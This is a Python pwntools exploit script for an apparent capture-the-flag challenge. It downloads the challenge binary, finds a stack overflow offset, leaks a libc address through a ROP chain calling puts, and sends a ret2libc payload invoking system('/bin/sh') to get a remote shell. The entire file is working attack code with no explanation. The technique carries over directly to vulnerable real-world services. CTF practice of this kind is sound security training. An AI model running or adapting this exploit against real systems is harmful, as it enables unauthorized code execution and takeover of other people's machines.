import os
from pwn import *
from base64 import b64decode

c = remote("challs.xmas.htsp.ro", 12002)
libc = ELF("libc-2.27.so")

############## Solving padding Problems ################
info("Downloading Binary....")
c.recvuntil("'")
bindata=c.recvuntil("'")
bindata=str(bindata)[0:len(bindata)-1]
with open("bin_sv_file", "wb+") as file:
	file.write(b64decode(bindata))
	file.close()

os.system("chmod +x bin_sv_file")
io = process("./bin_sv_file")
io.sendlineafter("name? ", cyclic(300))
io.wait()
core = io.corefile
rsp = core.rsp
pattern = core.read(rsp, 4)
offset_rsp = cyclic_find(pattern)
success("Offset to $RSP => %s"%offset_rsp)
e = ELF("./bin_sv_file")
rop = ROP(e)

########################################################

pad = cyclic(int(offset_rsp))
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
puts = e.plt["puts"]
libc_start_main = e.symbols["__libc_start_main"]
entry_point = 0x400630
ret = (rop.find_gadget(['ret']))[0]

xpl = pad + p64(pop_rdi) + p64(libc_start_main) + p64(puts) + p64(entry_point)

c.sendlineafter("name? ", xpl)
c.recvline()
c.recvline()
#p.recvline() #addr leakage

libc_start_main_leaked = u64(c.recvline().strip().ljust(8, "\x00"))
success("__libc_start_main leaked => %s"%hex(libc_start_main_leaked))

libc.address = libc_start_main_leaked - libc.sym["__libc_start_main"]
info("libc base => 0x%x"%libc.address)

system = libc.sym["system"]
str_bin_sh = next(libc.search("/bin/sh"))

info("system => %x"%system)
info("str_bin_sh => %x"%str_bin_sh)

xpl = pad + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system)
c.sendlineafter("name? ", xpl)

c.interactive()